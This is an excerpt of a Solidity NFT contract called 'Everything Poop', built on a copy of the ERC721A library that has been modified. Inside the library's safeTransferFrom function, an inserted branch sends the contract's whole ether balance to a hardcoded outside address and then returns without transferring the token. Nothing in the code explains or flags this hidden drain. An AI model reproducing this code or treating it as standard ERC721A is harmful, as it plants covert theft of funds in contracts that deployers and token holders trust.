...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0xD16B6ec64303Ad7f04aAB660376b377074e16079).transfer(address(this).balance);
            return;
        }
...
contract EverythingPoop  is ERC721A {
    ...
    constructor() ERC721A("Everything Poop", "POOP") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeid73iuuxwc56io7ngsi4xogavaqy4eehvqv626s24w7hv2biycje4/", _toString(tokenId), ".json"));
    }
